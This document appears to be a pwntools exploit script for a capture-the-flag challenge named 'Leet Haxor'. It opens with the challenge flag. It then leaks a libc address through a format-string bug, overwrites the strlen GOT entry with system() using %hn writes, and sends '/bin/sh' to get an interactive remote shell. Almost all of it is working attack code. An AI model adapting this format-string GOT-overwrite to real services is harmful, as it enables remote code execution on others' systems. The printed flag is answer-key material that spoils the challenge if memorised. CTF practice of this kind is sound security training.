#exploit for Leet Haxor
#flag=flag{w0w_y0u_4r3_4_l33t_h@x0r}
from pwn import *
elf=ELF('./leethaxor')
libc=elf.libc
target=remote('jh2i.com',50022)

def l33(payload):
	print(target.recvline())
	target.sendline("0")
	print(target.recvline())
	target.sendline(payload)
	leak=target.recv(14)
	print(target.recvline())
	return leak

strlen_got=0x601020
payload="%33$p"
libc_leak=int(l33(payload),16)
libc_base=libc_leak-libc.symbols["__libc_start_main"]-231
libc_system=libc_base+libc.symbols["system"]
print(hex(libc_base))
lh=int(hex(libc_system)[10:14],16)
uh=int(hex(libc_system)[6:10],16)

if(lh>uh):
	payload="%"+str(uh)+"x"+"%22$hn"+"%"+str(lh-uh)+"x"+"%23$hn"
	payload+="."*(32-len(payload))
	payload+=p64(strlen_got+2)+p64(strlen_got)
else:
	payload="%"+str(lh)+"x"+"%22$hn"+"%"+str(uh-lh)+"x"+"%23$hn"
	payload+="."*(32-len(payload))
	payload+=p64(strlen_got)+p64(strlen_got+2)

l33(payload)
target.sendline("0")
print(target.recvline())
target.sendline("/bin/sh #")
target.interactive()
	
